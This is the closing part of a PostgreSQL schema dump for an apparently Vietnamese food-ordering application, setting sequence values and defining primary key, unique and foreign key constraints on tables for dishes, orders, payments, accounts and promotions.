SELECT pg_catalog.setval('public."LoaiTuyChon_MaLoaiTuyChon_seq"', 2, true);


--
-- TOC entry 5225 (class 0 OID 0)
-- Dependencies: 227
-- Name: MonAn_MaMonAn_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."MonAn_MaMonAn_seq"', 11, true);


--
-- TOC entry 5226 (class 0 OID 0)
-- Dependencies: 221
-- Name: NguoiDung_MaNguoiDung_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."NguoiDung_MaNguoiDung_seq"', 8, true);


--
-- TOC entry 5227 (class 0 OID 0)
-- Dependencies: 230
-- Name: Size_MaSize_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."Size_MaSize_seq"', 2, true);


--
-- TOC entry 5228 (class 0 OID 0)
-- Dependencies: 217
-- Name: TaiKhoan_MaTaiKhoan_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."TaiKhoan_MaTaiKhoan_seq"', 8, true);


--
-- TOC entry 5229 (class 0 OID 0)
-- Dependencies: 251
-- Name: ThanhToan_MaThanhToan_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."ThanhToan_MaThanhToan_seq"', 76, true);


--
-- TOC entry 5230 (class 0 OID 0)
-- Dependencies: 239
-- Name: TuyChon_MaTuyChon_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."TuyChon_MaTuyChon_seq"', 4, true);


--
-- TOC entry 4925 (class 2606 OID 25828)
-- Name: BienTheMonAn BienTheMonAn_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."BienTheMonAn"
    ADD CONSTRAINT "BienTheMonAn_pkey" PRIMARY KEY ("MaBienThe");


--
-- TOC entry 4965 (class 2606 OID 33433)
-- Name: ChiTietDonHang_ChiTietCombo ChiTietDonHang_ChiTietCombo_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_ChiTietCombo"
    ADD CONSTRAINT "ChiTietDonHang_ChiTietCombo_pkey" PRIMARY KEY ("MaCTDH_Combo");


--
-- TOC entry 4951 (class 2606 OID 25905)
-- Name: ChiTietDonHang_TuyChon ChiTietDonHang_TuyChon_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_TuyChon"
    ADD CONSTRAINT "ChiTietDonHang_TuyChon_pkey" PRIMARY KEY ("MaChiTiet", "MaTuyChon");


--
-- TOC entry 4949 (class 2606 OID 25900)
-- Name: ChiTietDonHang ChiTietDonHang_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang"
    ADD CONSTRAINT "ChiTietDonHang_pkey" PRIMARY KEY ("MaChiTiet");


--
-- TOC entry 4901 (class 2606 OID 25773)
-- Name: CoSo CoSo_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."CoSo"
    ADD CONSTRAINT "CoSo_pkey" PRIMARY KEY ("MaCoSo");


--
-- TOC entry 4963 (class 2606 OID 33363)
-- Name: Combo_ChiTiet Combo_ChiTiet_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo_ChiTiet"
    ADD CONSTRAINT "Combo_ChiTiet_pkey" PRIMARY KEY ("MaCombo", "MaBienThe");


--
-- TOC entry 4961 (class 2606 OID 33357)
-- Name: Combo Combo_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo"
    ADD CONSTRAINT "Combo_pkey" PRIMARY KEY ("MaCombo");


--
-- TOC entry 4967 (class 2606 OID 33460)
-- Name: DanhGiaMonAn DanhGiaMonAn_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaMonAn"
    ADD CONSTRAINT "DanhGiaMonAn_pkey" PRIMARY KEY ("MaDanhGiaMonAn");


--
-- TOC entry 4957 (class 2606 OID 25927)
-- Name: DanhGiaDonHang DanhGia_MaDonHang_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaDonHang"
    ADD CONSTRAINT "DanhGia_MaDonHang_key" UNIQUE ("MaDonHang");


--
-- TOC entry 4959 (class 2606 OID 25925)
-- Name: DanhGiaDonHang DanhGia_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaDonHang"
    ADD CONSTRAINT "DanhGia_pkey" PRIMARY KEY ("MaDanhGiaDonHang");


--
-- TOC entry 4913 (class 2606 OID 25801)
-- Name: DanhMuc DanhMuc_TenDanhMuc_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhMuc"
    ADD CONSTRAINT "DanhMuc_TenDanhMuc_key" UNIQUE ("TenDanhMuc");


--
-- TOC entry 4915 (class 2606 OID 25799)
-- Name: DanhMuc DanhMuc_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhMuc"
    ADD CONSTRAINT "DanhMuc_pkey" PRIMARY KEY ("MaDanhMuc");


--
-- TOC entry 4927 (class 2606 OID 25836)
-- Name: DeBanh DeBanh_TenDeBanh_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DeBanh"
    ADD CONSTRAINT "DeBanh_TenDeBanh_key" UNIQUE ("TenDeBanh");


--
-- TOC entry 4929 (class 2606 OID 25834)
-- Name: DeBanh DeBanh_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DeBanh"
    ADD CONSTRAINT "DeBanh_pkey" PRIMARY KEY ("MaDeBanh");


--
-- TOC entry 4945 (class 2606 OID 25884)
-- Name: DonHang DonHang_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DonHang"
    ADD CONSTRAINT "DonHang_pkey" PRIMARY KEY ("MaDonHang");


--
-- TOC entry 4969 (class 2606 OID 33483)
-- Name: KhuyenMai KhuyenMai_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."KhuyenMai"
    ADD CONSTRAINT "KhuyenMai_pkey" PRIMARY KEY ("MaKhuyenMai");


--
-- TOC entry 4947 (class 2606 OID 25893)
-- Name: LichSuTrangThaiDonHang LichSuTrangThaiDonHang_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LichSuTrangThaiDonHang"
    ADD CONSTRAINT "LichSuTrangThaiDonHang_pkey" PRIMARY KEY ("MaLichSu");


--
-- TOC entry 4909 (class 2606 OID 25793)
-- Name: LoaiMonAn LoaiMonAn_TenLoaiMonAn_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LoaiMonAn"
    ADD CONSTRAINT "LoaiMonAn_TenLoaiMonAn_key" UNIQUE ("TenLoaiMonAn");


--
-- TOC entry 4911 (class 2606 OID 25791)
-- Name: LoaiMonAn LoaiMonAn_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LoaiMonAn"
    ADD CONSTRAINT "LoaiMonAn_pkey" PRIMARY KEY ("MaLoaiMonAn");


--
-- TOC entry 4933 (class 2606 OID 25849)
-- Name: LoaiTuyChon LoaiTuyChon_TenLoaiTuyChon_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LoaiTuyChon"
    ADD CONSTRAINT "LoaiTuyChon_TenLoaiTuyChon_key" UNIQUE ("TenLoaiTuyChon");


--
-- TOC entry 4935 (class 2606 OID 25847)
-- Name: LoaiTuyChon LoaiTuyChon_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LoaiTuyChon"
    ADD CONSTRAINT "LoaiTuyChon_pkey" PRIMARY KEY ("MaLoaiTuyChon");


--
-- TOC entry 4919 (class 2606 OID 25814)
-- Name: MonAn_DanhMuc MonAn_DanhMuc_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DanhMuc"
    ADD CONSTRAINT "MonAn_DanhMuc_pkey" PRIMARY KEY ("MaMonAn", "MaDanhMuc");


--
-- TOC entry 4931 (class 2606 OID 25841)
-- Name: MonAn_DeBanh MonAn_DeBanh_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DeBanh"
    ADD CONSTRAINT "MonAn_DeBanh_pkey" PRIMARY KEY ("MaMonAn", "MaDeBanh");


--
-- TOC entry 4971 (class 2606 OID 33488)
-- Name: MonAn_KhuyenMai MonAn_KhuyenMai_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_KhuyenMai"
    ADD CONSTRAINT "MonAn_KhuyenMai_pkey" PRIMARY KEY ("MaMonAn", "MaKhuyenMai");


--
-- TOC entry 4941 (class 2606 OID 25866)
-- Name: MonAn_TuyChon MonAn_TuyChon_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_TuyChon"
    ADD CONSTRAINT "MonAn_TuyChon_pkey" PRIMARY KEY ("MaMonAn", "MaTuyChon");


--
-- TOC entry 4917 (class 2606 OID 25809)
-- Name: MonAn MonAn_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn"
    ADD CONSTRAINT "MonAn_pkey" PRIMARY KEY ("MaMonAn");


--
-- TOC entry 4903 (class 2606 OID 25783)
-- Name: NguoiDung NguoiDung_MaTaiKhoan_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."NguoiDung"
    ADD CONSTRAINT "NguoiDung_MaTaiKhoan_key" UNIQUE ("MaTaiKhoan");


--
-- TOC entry 4905 (class 2606 OID 25785)
-- Name: NguoiDung NguoiDung_SoDienThoai_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."NguoiDung"
    ADD CONSTRAINT "NguoiDung_SoDienThoai_key" UNIQUE ("SoDienThoai");


--
-- TOC entry 4907 (class 2606 OID 25781)
-- Name: NguoiDung NguoiDung_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."NguoiDung"
    ADD CONSTRAINT "NguoiDung_pkey" PRIMARY KEY ("MaNguoiDung");


--
-- TOC entry 4921 (class 2606 OID 25822)
-- Name: Size Size_TenSize_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Size"
    ADD CONSTRAINT "Size_TenSize_key" UNIQUE ("TenSize");


--
-- TOC entry 4923 (class 2606 OID 25820)
-- Name: Size Size_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Size"
    ADD CONSTRAINT "Size_pkey" PRIMARY KEY ("MaSize");


--
-- TOC entry 4897 (class 2606 OID 26060)
-- Name: TaiKhoan TaiKhoan_Email_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TaiKhoan"
    ADD CONSTRAINT "TaiKhoan_Email_key" UNIQUE ("Email");


--
-- TOC entry 4899 (class 2606 OID 25763)
-- Name: TaiKhoan TaiKhoan_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TaiKhoan"
    ADD CONSTRAINT "TaiKhoan_pkey" PRIMARY KEY ("MaTaiKhoan");


--
-- TOC entry 4953 (class 2606 OID 25916)
-- Name: ThanhToan ThanhToan_MaGiaoDich_key; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ThanhToan"
    ADD CONSTRAINT "ThanhToan_MaGiaoDich_key" UNIQUE ("MaGiaoDich");


--
-- TOC entry 4955 (class 2606 OID 25912)
-- Name: ThanhToan ThanhToan_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ThanhToan"
    ADD CONSTRAINT "ThanhToan_pkey" PRIMARY KEY ("MaThanhToan");


--
-- TOC entry 4939 (class 2606 OID 25861)
-- Name: TuyChon_Gia TuyChon_Gia_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TuyChon_Gia"
    ADD CONSTRAINT "TuyChon_Gia_pkey" PRIMARY KEY ("MaTuyChon", "MaSize");


--
-- TOC entry 4937 (class 2606 OID 25855)
-- Name: TuyChon TuyChon_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TuyChon"
    ADD CONSTRAINT "TuyChon_pkey" PRIMARY KEY ("MaTuyChon");


--
-- TOC entry 4943 (class 2606 OID 25875)
-- Name: Voucher Voucher_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Voucher"
    ADD CONSTRAINT "Voucher_pkey" PRIMARY KEY ("MaVoucher");


--
-- TOC entry 4977 (class 2606 OID 25953)
-- Name: BienTheMonAn BienTheMonAn_MaMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."BienTheMonAn"
    ADD CONSTRAINT "BienTheMonAn_MaMonAn_fkey" FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn");


--
-- TOC entry 4978 (class 2606 OID 25958)
-- Name: BienTheMonAn BienTheMonAn_MaSize_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."BienTheMonAn"
    ADD CONSTRAINT "BienTheMonAn_MaSize_fkey" FOREIGN KEY ("MaSize") REFERENCES public."Size"("MaSize");


--
-- TOC entry 5002 (class 2606 OID 33439)
-- Name: ChiTietDonHang_ChiTietCombo ChiTietDonHang_ChiTietCombo_MaBienThe_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_ChiTietCombo"
    ADD CONSTRAINT "ChiTietDonHang_ChiTietCombo_MaBienThe_fkey" FOREIGN KEY ("MaBienThe") REFERENCES public."BienTheMonAn"("MaBienThe");


--
-- TOC entry 5003 (class 2606 OID 33434)
-- Name: ChiTietDonHang_ChiTietCombo ChiTietDonHang_ChiTietCombo_MaChiTietDonHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_ChiTietCombo"
    ADD CONSTRAINT "ChiTietDonHang_ChiTietCombo_MaChiTietDonHang_fkey" FOREIGN KEY ("MaChiTietDonHang") REFERENCES public."ChiTietDonHang"("MaChiTiet") ON DELETE CASCADE;


--
-- TOC entry 5004 (class 2606 OID 33444)
-- Name: ChiTietDonHang_ChiTietCombo ChiTietDonHang_ChiTietCombo_MaDeBanh_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_ChiTietCombo"
    ADD CONSTRAINT "ChiTietDonHang_ChiTietCombo_MaDeBanh_fkey" FOREIGN KEY ("MaDeBanh") REFERENCES public."DeBanh"("MaDeBanh");


--
-- TOC entry 4991 (class 2606 OID 26028)
-- Name: ChiTietDonHang ChiTietDonHang_MaBienThe_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang"
    ADD CONSTRAINT "ChiTietDonHang_MaBienThe_fkey" FOREIGN KEY ("MaBienThe") REFERENCES public."BienTheMonAn"("MaBienThe");


--
-- TOC entry 4992 (class 2606 OID 33374)
-- Name: ChiTietDonHang ChiTietDonHang_MaCombo_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang"
    ADD CONSTRAINT "ChiTietDonHang_MaCombo_fkey" FOREIGN KEY ("MaCombo") REFERENCES public."Combo"("MaCombo");


--
-- TOC entry 4993 (class 2606 OID 26033)
-- Name: ChiTietDonHang ChiTietDonHang_MaDeBanh_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang"
    ADD CONSTRAINT "ChiTietDonHang_MaDeBanh_fkey" FOREIGN KEY ("MaDeBanh") REFERENCES public."DeBanh"("MaDeBanh");


--
-- TOC entry 4994 (class 2606 OID 26023)
-- Name: ChiTietDonHang ChiTietDonHang_MaDonHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang"
    ADD CONSTRAINT "ChiTietDonHang_MaDonHang_fkey" FOREIGN KEY ("MaDonHang") REFERENCES public."DonHang"("MaDonHang");


--
-- TOC entry 4995 (class 2606 OID 26038)
-- Name: ChiTietDonHang_TuyChon ChiTietDonHang_TuyChon_MaChiTiet_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_TuyChon"
    ADD CONSTRAINT "ChiTietDonHang_TuyChon_MaChiTiet_fkey" FOREIGN KEY ("MaChiTiet") REFERENCES public."ChiTietDonHang"("MaChiTiet");


--
-- TOC entry 4996 (class 2606 OID 26043)
-- Name: ChiTietDonHang_TuyChon ChiTietDonHang_TuyChon_MaTuyChon_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_TuyChon"
    ADD CONSTRAINT "ChiTietDonHang_TuyChon_MaTuyChon_fkey" FOREIGN KEY ("MaTuyChon") REFERENCES public."TuyChon"("MaTuyChon");


--
-- TOC entry 4999 (class 2606 OID 33369)
-- Name: Combo_ChiTiet Combo_ChiTiet_MaBienThe_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo_ChiTiet"
    ADD CONSTRAINT "Combo_ChiTiet_MaBienThe_fkey" FOREIGN KEY ("MaBienThe") REFERENCES public."BienTheMonAn"("MaBienThe");


--
-- TOC entry 5000 (class 2606 OID 33364)
-- Name: Combo_ChiTiet Combo_ChiTiet_MaCombo_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo_ChiTiet"
    ADD CONSTRAINT "Combo_ChiTiet_MaCombo_fkey" FOREIGN KEY ("MaCombo") REFERENCES public."Combo"("MaCombo") ON DELETE CASCADE;


--
-- TOC entry 5001 (class 2606 OID 33379)
-- Name: Combo_ChiTiet Combo_ChiTiet_MaDeBanh_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo_ChiTiet"
    ADD CONSTRAINT "Combo_ChiTiet_MaDeBanh_fkey" FOREIGN KEY ("MaDeBanh") REFERENCES public."DeBanh"("MaDeBanh");


--
-- TOC entry 5005 (class 2606 OID 33461)
-- Name: DanhGiaMonAn DanhGiaMonAn_MaMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaMonAn"
    ADD CONSTRAINT "DanhGiaMonAn_MaMonAn_fkey" FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn") ON DELETE CASCADE;


--
-- TOC entry 5006 (class 2606 OID 33466)
-- Name: DanhGiaMonAn DanhGiaMonAn_MaTaiKhoan_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaMonAn"
    ADD CONSTRAINT "DanhGiaMonAn_MaTaiKhoan_fkey" FOREIGN KEY ("MaTaiKhoan") REFERENCES public."TaiKhoan"("MaTaiKhoan") ON DELETE CASCADE;


--
-- TOC entry 4998 (class 2606 OID 26053)
-- Name: DanhGiaDonHang DanhGia_MaDonHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaDonHang"
    ADD CONSTRAINT "DanhGia_MaDonHang_fkey" FOREIGN KEY ("MaDonHang") REFERENCES public."DonHang"("MaDonHang");


--
-- TOC entry 4986 (class 2606 OID 26003)
-- Name: DonHang DonHang_MaCoSo_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DonHang"
    ADD CONSTRAINT "DonHang_MaCoSo_fkey" FOREIGN KEY ("MaCoSo") REFERENCES public."CoSo"("MaCoSo");


--
-- TOC entry 4987 (class 2606 OID 26008)
-- Name: DonHang DonHang_MaNguoiDungGiaoHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DonHang"
    ADD CONSTRAINT "DonHang_MaNguoiDungGiaoHang_fkey" FOREIGN KEY ("MaNguoiDungGiaoHang") REFERENCES public."NguoiDung"("MaNguoiDung");


--
-- TOC entry 4988 (class 2606 OID 25998)
-- Name: DonHang DonHang_MaNguoiDung_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DonHang"
    ADD CONSTRAINT "DonHang_MaNguoiDung_fkey" FOREIGN KEY ("MaNguoiDung") REFERENCES public."NguoiDung"("MaNguoiDung");


--
-- TOC entry 4989 (class 2606 OID 26013)
-- Name: DonHang DonHang_MaVoucher_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DonHang"
    ADD CONSTRAINT "DonHang_MaVoucher_fkey" FOREIGN KEY ("MaVoucher") REFERENCES public."Voucher"("MaVoucher");


--
-- TOC entry 4990 (class 2606 OID 26018)
-- Name: LichSuTrangThaiDonHang LichSuTrangThaiDonHang_MaDonHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."LichSuTrangThaiDonHang"
    ADD CONSTRAINT "LichSuTrangThaiDonHang_MaDonHang_fkey" FOREIGN KEY ("MaDonHang") REFERENCES public."DonHang"("MaDonHang");


--
-- TOC entry 4975 (class 2606 OID 25948)
-- Name: MonAn_DanhMuc MonAn_DanhMuc_MaDanhMuc_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DanhMuc"
    ADD CONSTRAINT "MonAn_DanhMuc_MaDanhMuc_fkey" FOREIGN KEY ("MaDanhMuc") REFERENCES public."DanhMuc"("MaDanhMuc");


--
-- TOC entry 4976 (class 2606 OID 25943)
-- Name: MonAn_DanhMuc MonAn_DanhMuc_MaMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DanhMuc"
    ADD CONSTRAINT "MonAn_DanhMuc_MaMonAn_fkey" FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn");


--
-- TOC entry 4979 (class 2606 OID 25968)
-- Name: MonAn_DeBanh MonAn_DeBanh_MaDeBanh_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DeBanh"
    ADD CONSTRAINT "MonAn_DeBanh_MaDeBanh_fkey" FOREIGN KEY ("MaDeBanh") REFERENCES public."DeBanh"("MaDeBanh");


--
-- TOC entry 4980 (class 2606 OID 25963)
-- Name: MonAn_DeBanh MonAn_DeBanh_MaMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_DeBanh"
    ADD CONSTRAINT "MonAn_DeBanh_MaMonAn_fkey" FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn");


--
-- TOC entry 4974 (class 2606 OID 25938)
-- Name: MonAn MonAn_MaLoaiMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn"
    ADD CONSTRAINT "MonAn_MaLoaiMonAn_fkey" FOREIGN KEY ("MaLoaiMonAn") REFERENCES public."LoaiMonAn"("MaLoaiMonAn");


--
-- TOC entry 4984 (class 2606 OID 25988)
-- Name: MonAn_TuyChon MonAn_TuyChon_MaMonAn_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_TuyChon"
    ADD CONSTRAINT "MonAn_TuyChon_MaMonAn_fkey" FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn");


--
-- TOC entry 4985 (class 2606 OID 25993)
-- Name: MonAn_TuyChon MonAn_TuyChon_MaTuyChon_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_TuyChon"
    ADD CONSTRAINT "MonAn_TuyChon_MaTuyChon_fkey" FOREIGN KEY ("MaTuyChon") REFERENCES public."TuyChon"("MaTuyChon");


--
-- TOC entry 4972 (class 2606 OID 25933)
-- Name: NguoiDung NguoiDung_MaCoSo_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."NguoiDung"
    ADD CONSTRAINT "NguoiDung_MaCoSo_fkey" FOREIGN KEY ("MaCoSo") REFERENCES public."CoSo"("MaCoSo");


--
-- TOC entry 4973 (class 2606 OID 25928)
-- Name: NguoiDung NguoiDung_MaTaiKhoan_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."NguoiDung"
    ADD CONSTRAINT "NguoiDung_MaTaiKhoan_fkey" FOREIGN KEY ("MaTaiKhoan") REFERENCES public."TaiKhoan"("MaTaiKhoan");


--
-- TOC entry 4997 (class 2606 OID 26048)
-- Name: ThanhToan ThanhToan_MaDonHang_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ThanhToan"
    ADD CONSTRAINT "ThanhToan_MaDonHang_fkey" FOREIGN KEY ("MaDonHang") REFERENCES public."DonHang"("MaDonHang");


--
-- TOC entry 4982 (class 2606 OID 25983)
-- Name: TuyChon_Gia TuyChon_Gia_MaSize_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TuyChon_Gia"
    ADD CONSTRAINT "TuyChon_Gia_MaSize_fkey" FOREIGN KEY ("MaSize") REFERENCES public."Size"("MaSize");


--
-- TOC entry 4983 (class 2606 OID 25978)
-- Name: TuyChon_Gia TuyChon_Gia_MaTuyChon_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TuyChon_Gia"
    ADD CONSTRAINT "TuyChon_Gia_MaTuyChon_fkey" FOREIGN KEY ("MaTuyChon") REFERENCES public."TuyChon"("MaTuyChon");


--
-- TOC entry 4981 (class 2606 OID 25973)
-- Name: TuyChon TuyChon_MaLoaiTuyChon_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."TuyChon"
    ADD CONSTRAINT "TuyChon_MaLoaiTuyChon_fkey" FOREIGN KEY ("MaLoaiTuyChon") REFERENCES public."LoaiTuyChon"("MaLoaiTuyChon");


--
-- TOC entry 5007 (class 2606 OID 33494)
-- Name: MonAn_KhuyenMai fk_khuyenmai; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_KhuyenMai"
    ADD CONSTRAINT fk_khuyenmai FOREIGN KEY ("MaKhuyenMai") REFERENCES public."KhuyenMai"("MaKhuyenMai") ON DELETE CASCADE;


--
-- TOC entry 5008 (class 2606 OID 33489)
-- Name: MonAn_KhuyenMai fk_monan; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."MonAn_KhuyenMai"
    ADD CONSTRAINT fk_monan FOREIGN KEY ("MaMonAn") REFERENCES public."MonAn"("MaMonAn") ON DELETE CASCADE;


-- Completed on 2025-11-16 04:53:13

--
-- PostgreSQL database dump complete
--

